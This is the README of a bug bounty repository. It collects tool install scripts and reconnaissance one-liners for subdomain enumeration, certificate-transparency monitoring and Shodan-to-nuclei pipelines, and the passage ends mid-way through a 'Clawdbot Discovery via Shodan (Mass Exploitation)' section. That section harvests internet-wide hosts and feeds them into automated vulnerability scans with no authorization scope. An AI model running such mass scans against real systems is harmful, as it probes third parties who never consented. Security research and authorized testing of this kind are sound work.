<div align="center">

# KingOfBugBountyTips

<img src="https://media.giphy.com/media/077i6AULCXc0FKTj9s/giphy.gif" width="500" alt="Tactical Recon">

**The Ultimate Bug Bounty Reconnaissance Arsenal**

*"In the shadows we hunt, in the code we trust"*

---

[![Stars](https://img.shields.io/github/stars/KingOfBugbounty/KingOfBugBountyTips?style=flat-square&color=yellow)](https://github.com/KingOfBugbounty/KingOfBugBountyTips/stargazers)
[![Forks](https://img.shields.io/github/forks/KingOfBugbounty/KingOfBugBountyTips?style=flat-square&color=blue)](https://github.com/KingOfBugbounty/KingOfBugBountyTips/network/members)
[![Last Commit](https://img.shields.io/github/last-commit/KingOfBugbounty/KingOfBugBountyTips?style=flat-square&color=green)](https://github.com/KingOfBugbounty/KingOfBugBountyTips/commits/master)
[![License](https://img.shields.io/github/license/KingOfBugbounty/KingOfBugBountyTips?style=flat-square)](LICENSE)

---

[Telegram](https://t.me/joinchat/DN_iQksIuhyPKJL1gw0ttA) | [Twitter](https://twitter.com/ofjaaah) | [YouTube](https://www.youtube.com/c/OFJAAAH) | [LinkedIn](https://www.linkedin.com/in/atjunior/)

</div>

---

## DoD VDP Scope

> [DoD Vulnerability Disclosure Program](https://hackerone.com/deptofdefense) | [KingRecon DOD](https://github.com/KingOfBugbounty/KingRecon_DOD)

<details>
<summary><b>Full DoD Scope - 19 Domains</b></summary>

```bash
# BBRF Scope - All DoD Domains
bbrf inscope add '*.af.mil' '*.army.mil' '*.marines.mil' '*.navy.mil' '*.spaceforce.mil' '*.ussf.mil' '*.pentagon.mil' '*.osd.mil' '*.disa.mil' '*.dtra.mil' '*.dla.mil' '*.dcma.mil' '*.dtic.mil' '*.dau.mil' '*.health.mil' '*.ng.mil' '*.uscg.mil' '*.socom.mil' '*.dds.mil' '*.yellowribbon.mil'
```

| Military Branches | DoD Agencies | Support Commands |
|:-----------------|:-------------|:-----------------|
| `*.af.mil` - Air Force | `*.pentagon.mil` - Pentagon HQ | `*.dtic.mil` - Tech Info Center |
| `*.army.mil` - Army | `*.osd.mil` - Office of SecDef | `*.dau.mil` - Acquisition Univ |
| `*.marines.mil` - Marines | `*.disa.mil` - Defense Info Systems | `*.health.mil` - Military Health |
| `*.navy.mil` - Navy | `*.dtra.mil` - Threat Reduction | `*.ng.mil` - National Guard |
| `*.spaceforce.mil` - Space Force | `*.dla.mil` - Logistics Agency | `*.uscg.mil` - Coast Guard |
| `*.ussf.mil` - Space Force | `*.dcma.mil` - Contract Management | `*.socom.mil` - Special Operations |

</details>

---

## Security Notice

> **This repository is for EDUCATIONAL and AUTHORIZED testing ONLY.**
> Always obtain proper authorization before testing.

<details>
<summary><b>📜 Click to read our Security Policy & Guidelines</b></summary>

<br>

### ✅ Permitted Use Cases

- ✅ **Authorized Bug Bounty Programs** - HackerOne, Bugcrowd, Intigriti, etc.
- ✅ **Authorized Penetration Testing** - With written permission
- ✅ **Personal Lab Environments** - Your own infrastructure
- ✅ **Educational Purposes** - Learning and research
- ✅ **DoD VDP Program** - Following program rules

### ❌ Prohibited Activities

- ❌ **Unauthorized Testing** - Testing without explicit permission
- ❌ **Malicious Intent** - Using techniques for harm or theft
- ❌ **Out-of-Scope Testing** - Testing targets outside program scope
- ❌ **Social Engineering** - Unless explicitly allowed in program
- ❌ **DoS/DDoS Attacks** - Resource exhaustion attacks

### 📋 Responsible Disclosure Guidelines

1. **Read the Program Policy** - Always review scope and rules
2. **Test Safely** - Don't cause harm to production systems
3. **Document Everything** - Keep detailed notes of your findings
4. **Report Privately** - Use official channels for disclosure
5. **Give Time to Fix** - Allow vendors reasonable time to patch
6. **Be Professional** - Maintain ethical standards

### 🔒 Report Security Issues

Found a security issue in this repository? Please report it responsibly:

[![Report Issue](https://img.shields.io/badge/Report-Security%20Issue-red?style=for-the-badge&logo=github)](https://github.com/KingOfBugbounty/KingOfBugBountyTips/security/advisories/new)

</details>

---

## 📚 Table of Contents

<details>
<summary><b>Click to expand navigation</b></summary>

| Section | Description |
|:--------|:------------|
| [About](#-about) | Project overview and goals |
| [Quick Start](#-quick-start) | Get started in 5 minutes |
| [Required Tools](#-required-tools) | Essential toolset |
| [BBRF Scope DoD](#-bbrf-scope-dod) | DoD scope configuration |
| [Subdomain Enumeration](#-subdomain-enumeration) | Finding subdomains |
| [JavaScript Recon](#-javascript-recon) | JS file analysis |
| [XSS Detection](#-xss-detection) | Cross-site scripting |
| [SQL Injection](#-sql-injection) | SQLi techniques |
| [SSRF & SSTI](#-ssrf--ssti) | Server-side attacks |
| [Web Crawling](#-web-crawling) | Deep crawling methods |
| [Parameter Discovery](#-parameter-discovery) | Hidden params |
| [Content Discovery](#-content-discovery) | Sensitive files |
| [Nuclei Scanning](#-nuclei-scanning) | Automated scanning |
| [API Security Testing](#-api-security-testing) | API vulnerabilities |
| [Cloud Security](#-cloud-security) | AWS, GCP, Azure |
| [Automation Scripts](#-automation-scripts) | Ready-to-use scripts |
| [Bash Functions](#-bash-functions) | Shell productivity |
| [New Oneliners 2026](#-new-oneliners-2026) | CVE-2026 exploits & techniques |
| [Oneliners 2024-2025](#-oneliners-2024-2025) | Previous techniques |
| [Search Engines](#-search-engines-for-hackers) | Hacker search engines |
| [Wordlists](#-recommended-wordlists) | Best wordlists |
| [Resources](#-learning-resources) | Books, courses, blogs |

</details>

---

## 🎯 About

<div align="center">

```ascii
╔═══════════════════════════════════════════════════════════════╗
║                 🎯 MISSION STATEMENT 🎯                       ║
╠═══════════════════════════════════════════════════════════════╣
║  Share elite bug bounty techniques from world-class hunters   ║
║  Build the most comprehensive one-liner collection           ║
║  Empower the security research community                     ║
╚═══════════════════════════════════════════════════════════════╝
```

</div>

Our main goal is to share tips from well-known bug hunters. Using advanced recon methodology, we discover subdomains, APIs, tokens, and vulnerabilities that are exploitable. We aim to influence and educate the community with powerful one-liner techniques for better understanding and faster results.

### 🏆 What Makes This Repository Special?

<table>
  <tr>
    <td align="center" width="25%">
      <img src="https://img.shields.io/badge/400+-Oneliners-brightgreen?style=for-the-badge&logo=terminal" alt="Oneliners"><br>
      <b>💎 Curated Commands</b><br>
      <sub>Battle-tested from real hunters</sub>
    </td>
    <td align="center" width="25%">
      <img src="https://img.shields.io/badge/Complete-Methodology-blue?style=for-the-badge&logo=hackthebox" alt="Methodology"><br>
      <b>🎯 Full Methodology</b><br>
      <sub>Recon to exploitation</sub>
    </td>
    <td align="center" width="25%">
      <img src="https://img.shields.io/badge/2026-Updated-orange?style=for-the-badge&logo=github" alt="Updated"><br>
      <b>🔄 Constantly Updated</b><br>
      <sub>New techniques weekly</sub>
    </td>
    <td align="center" width="25%">
      <img src="https://img.shields.io/badge/Community-Driven-red?style=for-the-badge&logo=discord" alt="Community"><br>
      <b>🌍 Community Driven</b><br>
      <sub>Top hunters worldwide</sub>
    </td>
  </tr>
</table>

### 📦 Special Resources

<div align="center">

[![BugBuntu](https://img.shields.io/badge/Download-BugBuntu%20OS-orange?style=for-the-badge&logo=linux&logoColor=white)](https://sourceforge.net/projects/bugbuntu/)
[![KingRecon](https://img.shields.io/badge/Try-KingRecon%20DOD-gold?style=for-the-badge&logo=github&logoColor=black)](https://github.com/KingOfBugbounty/KingRecon_DOD)
[![Contribute](https://img.shields.io/badge/Contribute-Welcome-success?style=for-the-badge&logo=github&logoColor=white)](https://github.com/KingOfBugbounty/KingOfBugBountyTips/pulls)

</div>

### 📊 Repository Highlights

<details>
<summary><b>📈 Click to see detailed statistics</b></summary>

<br>

| Category | Count | Status |
|:---------|:-----:|:------:|
| **One-Liners** | 400+ | ✅ Active |
| **Techniques** | 50+ | ✅ Active |
| **Tools Covered** | 100+ | ✅ Active |
| **CVE Examples** | 20+ | ✅ Active |
| **DoD Domains** | 19 | ✅ Active |
| **Contributors** | Growing | 🚀 Growing |
| **Last Update** | 2026 | ✅ Current |

</details>

---

## 🚀 Quick Start

<div align="center">

### ⚡ Get your first recon running in under 5 minutes

</div>

<table>
  <tr>
    <td width="33%" align="center">
      <h3>1️⃣ Install Tools</h3>
      <img src="https://img.shields.io/badge/Time-2%20mins-blue?style=for-the-badge" alt="Time">
    </td>
    <td width="33%" align="center">
      <h3>2️⃣ Run Recon</h3>
      <img src="https://img.shields.io/badge/Time-1%20min-green?style=for-the-badge" alt="Time">
    </td>
    <td width="33%" align="center">
      <h3>3️⃣ Find Bugs</h3>
      <img src="https://img.shields.io/badge/Time-2%20mins-red?style=for-the-badge" alt="Time">
    </td>
  </tr>
</table>

```bash
# 📥 Step 1: Install essential tools (ProjectDiscovery Suite)
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# 🔍 Step 2: Run your first reconnaissance chain
subfinder -d target.com -silent | httpx -silent | nuclei -severity critical,high

# 🎉 Step 3: Analyze results and profit!
# Check the output for vulnerabilities and start reporting!
```

<details>
<summary><b>🎬 Want a complete automated workflow? Click here!</b></summary>

<br>

```bash
# 🚀 Advanced Quick Start - Complete Recon Pipeline
TARGET="target.com"

# Subdomain enumeration with multiple sources
subfinder -d $TARGET -all -silent | \
httpx -silent -title -status-code -tech-detect -follow-redirects | \
tee subdomains_live.txt

# Deep crawling and parameter discovery
cat subdomains_live.txt | katana -silent -d 3 -jc | \
grep -E '\\.js$' | \
httpx -silent -mc 200 | \
tee js_files.txt

# Vulnerability scanning with Nuclei
nuclei -l subdomains_live.txt -severity critical,high,medium -silent -o nuclei_results.txt

# 💎 Results saved in:
# - subdomains_live.txt (Live domains)
# - js_files.txt (JavaScript files)
# - nuclei_results.txt (Vulnerabilities found)
```

</details>

<div align="center">

### 🎯 Pro Tips for Beginners

| Tip | Description |
|:---:|:------------|
| 🔑 | Always get proper authorization before testing |
| 📝 | Keep detailed notes of your findings |
| 🛠️ | Start with automated tools, then manual testing |
| 💰 | Focus on high-impact vulnerabilities first |
| 🤝 | Join the community and learn from others |

</div>

---

## 🛠️ Required Tools

<details>
<summary><b>Click to expand complete tool list</b></summary>

### Core Tools

| Category | Tools | Installation |
|:--------:|:------|:-------------|
| **Subdomain** | [Subfinder](https://github.com/projectdiscovery/subfinder), [Amass](https://github.com/OWASP/Amass), [Assetfinder](https://github.com/tomnomnom/assetfinder), [Findomain](https://github.com/Edu4rdSHL/findomain), [Chaos](https://github.com/projectdiscovery/chaos-client) | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| **HTTP Probing** | [Httpx](https://github.com/projectdiscovery/httpx), [Httprobe](https://github.com/tomnomnom/httprobe) | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
| **Crawling** | [Katana](https://github.com/projectdiscovery/katana), [Gospider](https://github.com/jaeles-project/gospider), [Hakrawler](https://github.com/hakluke/hakrawler), [Cariddi](https://github.com/edoardottt/cariddi) | `go install github.com/projectdiscovery/katana/cmd/katana@latest` |
| **URLs** | [Gau](https://github.com/lc/gau), [Waybackurls](https://github.com/tomnomnom/waybackurls), [Waymore](https://github.com/xnl-h4ck3r/waymore) | `go install github.com/lc/gau/v2/cmd/gau@latest` |
| **Scanning** | [Nuclei](https://github.com/projectdiscovery/nuclei), [Jaeles](https://github.com/jaeles-project/jaeles), [Naabu](https://github.com/projectdiscovery/naabu) | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| **XSS** | [Dalfox](https://github.com/hahwul/dalfox), [XSStrike](https://github.com/s0md3v/XSStrike), [Kxss](https://github.com/Emoe/kxss), [Airixss](https://github.com/ferreiraklet/airixss) | `go install github.com/hahwul/dalfox/v2@latest` |
| **SQLi** | [SQLMap](https://github.com/sqlmapproject/sqlmap), [Ghauri](https://github.com/r0oth3x49/ghauri) | `pip install sqlmap ghauri` |
| **Utilities** | [Anew](https://github.com/tomnomnom/anew), [Qsreplace](https://github.com/tomnomnom/qsreplace), [Unfurl](https://github.com/tomnomnom/unfurl), [Gf](https://github.com/tomnomnom/gf), [Uro](https://github.com/s0md3v/uro) | `go install github.com/tomnomnom/anew@latest` |
| **Fuzzing** | [Ffuf](https://github.com/ffuf/ffuf), [Feroxbuster](https://github.com/epi052/feroxbuster) | `go install github.com/ffuf/ffuf/v2@latest` |
| **JS Analysis** | [Subjs](https://github.com/lc/subjs), [LinkFinder](https://github.com/GerbenJavado/LinkFinder), [SecretFinder](https://github.com/m4ll0k/SecretFinder), [Jsubfinder](https://github.com/ThreatUnkown/jsubfinder) | `go install github.com/lc/subjs@latest` |
| **Cert Monitoring** | [Certstream](https://github.com/CaliDog/certstream-python), [Certstream-go](https://github.com/CaliDog/certstream-go) | `pip install certstream` |
| **DNS** | [Dnsx](https://github.com/projectdiscovery/dnsx), [Shuffledns](https://github.com/projectdiscovery/shuffledns), [PureDNS](https://github.com/d3mondev/puredns), [MassDNS](https://github.com/blechschmidt/massdns), [Dnsgen](https://github.com/ProjectAnte/dnsgen) | `go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest` |
| **Reverse DNS** | [Hakrevdns](https://github.com/hakluke/hakrevdns), [Prips](https://gitlab.com/prips/prips) | `go install github.com/hakluke/hakrevdns@latest` |
| **API Discovery** | [Arjun](https://github.com/s0md3v/Arjun), [x8](https://github.com/Sh1Yo/x8), [ParamSpider](https://github.com/devanshbatham/ParamSpider) | `pip install arjun` |
| **Screenshots** | [Gowitness](https://github.com/sensepost/gowitness), [Eyewitness](https://github.com/FortyNorthSecurity/EyeWitness) | `go install github.com/sensepost/gowitness@latest` |
| **Cloud** | [AWS CLI](https://aws.amazon.com/cli/), [CloudEnum](https://github.com/initstring/cloud_enum), [S3Scanner](https://github.com/sa7mon/S3Scanner) | `pip install awscli` |
| **OSINT** | [Shodan CLI](https://cli.shodan.io/), [Censys](https://github.com/censys/censys-python), [Metabigor](https://github.com/j3ssie/metabigor) | `pip install shodan censys` |
| **Git Recon** | [Trufflehog](https://github.com/trufflesecurity/trufflehog), [Gitrob](https://github.com/michenriksen/gitrob), [Github-Subdomains](https://github.com/gwen001/github-subdomains) | `go install github.com/trufflesecurity/trufflehog/v3@latest` |
| **Scope Management** | [BBRF](https://github.com/honoki/bbrf-client) | `pip install bbrf` |

### System Dependencies

```bash
# Ubuntu/Debian
sudo apt update && sudo apt install -y \
    jq \
    curl \
    wget \
    git \
    python3 \
    python3-pip \
    golang-go \
    nmap \
    masscan \
    chromium-browser \
    parallel \
    whois \
    dnsutils \
    libpcap-dev \
    build-essential

# macOS
brew install jq curl wget git python3 go nmap masscan chromium parallel whois bind
```

### Go Environment Setup

```bash
# Add to ~/.bashrc or ~/.zshrc
export GOPATH=$HOME/go
export GOROOT=/usr/local/go
export PATH=$PATH:$GOPATH/bin:$GOROOT/bin

# Reload shell
source ~/.bashrc  # or source ~/.zshrc
```

### Quick Install Script - Go Tools

```bash
#!/bin/bash
# One-click install for all Go tools

echo "[*] Installing Go tools..."
go_tools=(
    # ProjectDiscovery
    "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    "github.com/projectdiscovery/httpx/cmd/httpx@latest"
    "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    "github.com/projectdiscovery/katana/cmd/katana@latest"
    "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
    "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    "github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest"
    "github.com/projectdiscovery/chaos-client/cmd/chaos@latest"
    # Tomnomnom
    "github.com/tomnomnom/waybackurls@latest"
    "github.com/tomnomnom/anew@latest"
    "github.com/tomnomnom/qsreplace@latest"
    "github.com/tomnomnom/unfurl@latest"
    "github.com/tomnomnom/gf@latest"
    "github.com/tomnomnom/assetfinder@latest"
    "github.com/tomnomnom/httprobe@latest"
    # Fuzzing & Crawling
    "github.com/ffuf/ffuf/v2@latest"
    "github.com/jaeles-project/gospider@latest"
    "github.com/hakluke/hakrawler@latest"
    "github.com/hakluke/hakrevdns@latest"
    # Security
    "github.com/hahwul/dalfox/v2@latest"
    "github.com/lc/gau/v2/cmd/gau@latest"
    "github.com/lc/subjs@latest"
    # Screenshots & Utils
    "github.com/sensepost/gowitness@latest"
    "github.com/d3mondev/puredns/v2@latest"
    "github.com/j3ssie/metabigor@latest"
    "github.com/Emoe/kxss@latest"
    "github.com/ferreiraklet/airixss@latest"
    "github.com/edoardottt/cariddi/cmd/cariddi@latest"
    "github.com/trufflesecurity/trufflehog/v3@latest"
)

for tool in "${go_tools[@]}"; do
    echo "[+] Installing $tool"
    go install -v "$tool" 2>/dev/null
done

echo "[✓] Go tools installed!"
```

### Quick Install Script - Python Tools

```bash
#!/bin/bash
# One-click install for all Python tools

echo "[*] Installing Python tools..."

pip3 install --upgrade pip

pip3 install \
    certstream \
    sqlmap \
    ghauri \
    uro \
    arjun \
    paramspider \
    shodan \
    censys \
    bbrf \
    dnsgen \
    waymore \
    xsstrike \
    s3scanner \
    cloud_enum \
    trufflehog

echo "[✓] Python tools installed!"
```

### Quick Install Script - Rust Tools (Feroxbuster)

```bash
#!/bin/bash
# Install Feroxbuster (Rust)

echo "[*] Installing Rust tools..."

# Install Rust if not present
if ! command -v cargo &> /dev/null; then
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
    source $HOME/.cargo/env
fi

# Install Feroxbuster
cargo install feroxbuster

echo "[✓] Rust tools installed!"
```

### Quick Install Script - External Tools

```bash
#!/bin/bash
# Install tools that require cloning

echo "[*] Installing external tools..."

TOOLS_DIR="$HOME/tools"
mkdir -p $TOOLS_DIR && cd $TOOLS_DIR

# LinkFinder
git clone https://github.com/GerbenJavado/LinkFinder.git
cd LinkFinder && pip3 install -r requirements.txt && cd ..

# SecretFinder
git clone https://github.com/m4ll0k/SecretFinder.git
cd SecretFinder && pip3 install -r requirements.txt && cd ..

# Findomain
wget https://github.com/Findomain/Findomain/releases/latest/download/findomain-linux.zip
unzip findomain-linux.zip && chmod +x findomain && sudo mv findomain /usr/local/bin/

# MassDNS
git clone https://github.com/blechschmidt/massdns.git
cd massdns && make && sudo mv bin/massdns /usr/local/bin/ && cd ..

# Amass
go install -v github.com/owasp-amass/amass/v4/...@master

# GF Patterns
git clone https://github.com/1ndianl33t/Gf-Patterns.git
mkdir -p ~/.gf && cp Gf-Patterns/*.json ~/.gf/

echo "[✓] External tools installed!"
```

### Master Install Script (All-in-One)

```bash
#!/bin/bash
# MASTER INSTALLER - Run all installation scripts

echo "╔══════════════════════════════════════════════════════════╗"
echo "║     KingOfBugBounty - Complete Tool Installation         ║"
echo "╚══════════════════════════════════════════════════════════╝"

# System dependencies (run with sudo)
echo "[1/5] Installing system dependencies..."
sudo apt update && sudo apt install -y jq curl wget git python3 python3-pip golang-go nmap masscan chromium-browser parallel whois dnsutils libpcap-dev build-essential

# Go environment
echo "[2/5] Setting up Go environment..."
echo 'export GOPATH=$HOME/go' >> ~/.bashrc
echo 'export PATH=$PATH:$GOPATH/bin' >> ~/.bashrc
source ~/.bashrc

# Go tools
echo "[3/5] Installing Go tools..."
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install -v github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest
go install -v github.com/tomnomnom/waybackurls@latest
go install -v github.com/tomnomnom/anew@latest
go install -v github.com/tomnomnom/qsreplace@latest
go install -v github.com/tomnomnom/unfurl@latest
go install -v github.com/tomnomnom/gf@latest
go install -v github.com/tomnomnom/assetfinder@latest
go install -v github.com/ffuf/ffuf/v2@latest
go install -v github.com/hahwul/dalfox/v2@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/jaeles-project/gospider@latest
go install -v github.com/hakluke/hakrawler@latest
go install -v github.com/hakluke/hakrevdns@latest
go install -v github.com/sensepost/gowitness@latest
go install -v github.com/d3mondev/puredns/v2@latest
go install -v github.com/owasp-amass/amass/v4/...@master

# Python tools
echo "[4/5] Installing Python tools..."
pip3 install certstream sqlmap ghauri uro arjun shodan censys bbrf dnsgen waymore

# Rust tools
echo "[5/5] Installing Rust tools..."
if ! command -v cargo &> /dev/null; then
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
    source $HOME/.cargo/env
fi
cargo install feroxbuster

# Update Nuclei templates
nuclei -update-templates

echo ""
echo "╔══════════════════════════════════════════════════════════╗"
echo "║            ✓ Installation Complete!                      ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""
echo "Run 'source ~/.bashrc' to reload your environment"
```

### Wordlists Installation

```bash
#!/bin/bash
# Install essential wordlists

WORDLIST_DIR="$HOME/wordlists"
mkdir -p $WORDLIST_DIR && cd $WORDLIST_DIR

# SecLists
git clone https://github.com/danielmiessler/SecLists.git

# Assetnote Wordlists
wget -r --no-parent -R "index.html*" https://wordlists-cdn.assetnote.io/data/ -nH

# OneListForAll
git clone https://github.com/six2dez/OneListForAll.git

# Resolvers
wget https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -O resolvers.txt
wget https://raw.githubusercontent.com/trickest/resolvers/main/resolvers-trusted.txt -O resolvers-trusted.txt

echo "[✓] Wordlists installed in $WORDLIST_DIR"
```

### Verify Installation

```bash
#!/bin/bash
# Verify all tools are installed

echo "Checking installed tools..."

tools=("subfinder" "httpx" "nuclei" "katana" "naabu" "dnsx" "ffuf" "feroxbuster" "dalfox" "gau" "waybackurls" "anew" "qsreplace" "gf" "gospider" "hakrawler" "amass" "gowitness" "certstream" "sqlmap" "arjun" "shodan")

for tool in "${tools[@]}"; do
    if command -v $tool &> /dev/null; then
        echo "[✓] $tool"
    else
        echo "[✗] $tool - NOT FOUND"
    fi
done
```

</details>

---

## 🎯 BBRF Scope DoD

```bash
# Add all DoD domains to BBRF scope
bbrf inscope add '*.af.mil' '*.osd.mil' '*.marines.mil' '*.pentagon.mil' '*.disa.mil' '*.health.mil' '*.dau.mil' '*.dtra.mil' '*.ng.mil' '*.dds.mil' '*.uscg.mil' '*.army.mil' '*.dcma.mil' '*.dla.mil' '*.dtic.mil' '*.yellowribbon.mil' '*.socom.mil' '*.spaceforce.mil' '*.ussf.mil'
```

---

## 💀 Subdomain Enumeration ☠️

<div align="center">

```
███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███╗   ███╗ █████╗ ██╗███╗   ██╗
██╔════╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║
███████╗██║   ██║██████╔╝██║  ██║██║   ██║██╔████╔██║███████║██║██╔██╗ ██║
╚════██║██║   ██║██╔══██╗██║  ██║██║   ██║██║╚██╔╝██║██╔══██║██║██║╚██╗██║
███████║╚██████╔╝██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║██║ ╚████║
╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
```

**☠️ ENUMERATE EVERYTHING ☠️**

</div>

### 💀 Multi-Source Discovery (All-in-One)
```bash
# ☠️ Ultimate subdomain enumeration - All tools combined
subfinder -d target.com -all -silent | anew subs.txt
amass enum -passive -d target.com | anew subs.txt
assetfinder -subs-only target.com | anew subs.txt
chaos -d target.com -silent | anew subs.txt
findomain -t target.com -q | anew subs.txt
cat subs.txt | httpx -silent -threads 200 | anew alive.txt
```

### 💀 Certificate Transparency Logs
```bash
# ☠️ crt.sh extraction
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httpx -silent
```

### 💀 Certstream Real-Time Monitoring - Basic
```bash
# ☠️ Monitor certificates in real-time for specific keyword
pip install certstream && python3 -c "import certstream; certstream.listen_for_events(lambda msg, ctx: print(msg['data']['leaf_cert']['subject']['CN']) if 'target' in str(msg.get('data',{}).get('leaf_cert',{}).get('subject',{}).get('CN','')) else None, url='wss://certstream.calidog.io/')"
```

### 💀 Certstream with Domain Filter
```bash
# ☠️ Real-time cert monitoring filtered by domain keywords
certstream --full | jq -r 'select(.data.leaf_cert.subject.CN != null) | .data.leaf_cert.subject.CN' | grep -iE "(target|company|brand)" | anew certstream_targets.txt
```

### 💀 Certstream to Subdomain Discovery
```bash
# ☠️ Extract all SANs (Subject Alternative Names) in real-time
certstream --full | jq -r '.data.leaf_cert.extensions.subjectAltName // empty' | tr ',' '\n' | sed 's/DNS://g' | grep -E "target\.com$" | sort -u | anew certstream_subs.txt
```

### 💀 Certstream + httpx Live Pipeline
```bash
# ☠️ Real-time cert discovery -> immediate alive check
certstream --full | jq -r '.data.leaf_cert.all_domains[]? // empty' 2>/dev/null | grep -iE "target" | sort -u | while read domain; do echo "$domain" | httpx -silent -timeout 3 | anew live_certs.txt; done
```

### 💀 Certstream Phishing Detection
```bash
# ☠️ Monitor for potential phishing domains (brand impersonation)
certstream --full | jq -r '.data.leaf_cert.subject.CN // empty' | grep -iE "(paypal|apple|google|microsoft|amazon|facebook|netflix|bank)" | grep -vE "\.(paypal|apple|google|microsoft|amazon|facebook|netflix)\.com$" | anew phishing_certs.txt
```

### 💀 Certstream with Nuclei Auto-Scan
```bash
# ☠️ Real-time cert discovery -> automatic vulnerability scan
certstream --full | jq -r '.data.leaf_cert.all_domains[]? // empty' | grep -E "\.target\.com$" | sort -u | while read domain; do echo "https://$domain" | nuclei -t /nuclei-templates/technologies/ -silent; done
```

### 💀 Certstream Mass Collector Script
```bash
# ☠️ Collect all certificates for specific TLDs
timeout 3600 bash -c 'certstream --full | jq -r ".data.leaf_cert.all_domains[]? // empty" | grep -E "\.(gov|mil|edu)$" | anew gov_mil_edu_certs.txt' &
```

### 💀 Certstream Wildcard Certificate Hunter
```bash
# ☠️ Find wildcard certificates (*.domain.com) in real-time
certstream --full | jq -r '.data.leaf_cert.subject.CN // empty' | grep "^\*\." | sed 's/^\*\.//' | sort -u | anew wildcard_domains.txt
```

### 💀 Certstream + Shodan Enrichment
```bash
# ☠️ Real-time certs -> resolve IP -> Shodan lookup
certstream --full | jq -r '.data.leaf_cert.subject.CN // empty' | grep -iE "target" | while read domain; do IP=$(dig +short "$domain" | head -1); [ -n "$IP" ] && echo "$domain,$IP,$(shodan host $IP 2>/dev/null | head -3 | tr '\n' ' ')"; done | anew cert_shodan.txt
```

### 💀 Certstream JSON Logger with Timestamp
```bash
# ☠️ Full certificate logging with timestamps for analysis
certstream --full | jq -c '{timestamp: now | strftime("%Y-%m-%d %H:%M:%S"), cn: .data.leaf_cert.subject.CN, domains: .data.leaf_cert.all_domains, issuer: .data.leaf_cert.issuer.O}' | grep -i "target" | tee -a certstream_log.json
```

### 💀 Certstream Bug Bounty Scope Monitor
```bash
# ☠️ Monitor multiple bug bounty targets simultaneously
TARGETS="hackerone|bugcrowd|intigriti|yeswehack"; certstream --full | jq -r '.data.leaf_cert.all_domains[]? // empty' | grep -iE "$TARGETS" | anew bb_new_assets.txt &
```

### 💀 Shodan + Nuclei Pipeline
```bash
# ☠️ Shodan recon -> Nuclei scan
shodan domain target.com | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/ -severity critical,high
```

### 💀 Clawdbot Discovery via Shodan (Mass Exploitation)

#### ⚡ 1. Find Clawdbot Instances - Basic Search
```bash
# 💀 Locate Clawdbot servers exposed on the internet
shodan search "Clawdbot" --fields ip_str,port,hostnames,org | awk '{print $1":"$2}' | anew clawdbot_targets.txt
```

#### ⚡ 2. Clawdbot HTTP Headers Discovery
```bash
# 💀 Find servers with Clawdbot in HTTP headers
shodan search "http.headers:Clawdbot" --fields ip_str,port,http.title | tee clawdbot_http.txt | wc -l && echo "targets found"
```

#### ⚡ 3. Clawdbot User-Agent Detection
```bash
# 💀 Detect Clawdbot via User-Agent strings
shodan search "http.user_agent:Clawdbot" --fields ip_str,port,org,hostnames | awk -F'\t' '{print "https://"$1":"$2" - "$3}' | anew clawdbot_ua.txt
```

#### ⚡ 4. Clawdbot + Nuclei Exploitation Pipeline
```bash
# 💀 Mass Clawdbot discovery -> httpx alive -> Nuclei scan
shodan search "Clawdbot" --fields ip_str,port --limit 1000 | awk '{print $1":"$2}' | httpx -silent | nuclei -t ~/nuclei-templates/ -severity critical,high -o clawdbot_vulns.txt
```

#### ⚡ 5. Clawdbot Server Fingerprinting
```bash
# 💀 Extract detailed server info from Clawdbot hosts
shodan search "Clawdbot" --fields ip_str,port,os,product,version,org | sort -t$'\t' -k4 | anew clawdbot_fingerprint.txt
```

#### ⚡ 6. Clawdbot ASN Distribution Analysis
```bash
# 💀 Map Clawdbot instances by ASN for targeted reconnaissance
shodan search "Clawdbot" --fields ip_str,asn,org | awk '{print $2}' | sort | uniq -c | sort -rn | head -20 | tee clawdbot_asn_stats.txt
```

#### ⚡ 7. Clawdbot Geographic Distribution
```bash
# 💀 Find Clawdbot by country for geo-targeted testing
for country in US BR DE FR GB RU CN JP KR IN; do echo "=== $country ===" && shodan search "Clawdbot country:$country" --fields ip_str,port,city --limit 100 | anew clawdbot_${country}.txt; done
```

#### ⚡ 8. Clawdbot + Port Range Scan
```bash
# 💀 Discover Clawdbot on common web ports
shodan search "Clawdbot port:80,443,8080,8443,8000,3000,5000" --fields ip_str,port,http.server | awk '{print $1":"$2}' | httpx -silent -status-code -title | anew clawdbot_webports.txt
```

#### ⚡ 9. Clawdbot SSL Certificate Analysis
```bash
# 💀 Extract Clawdbot hosts with SSL certificate info
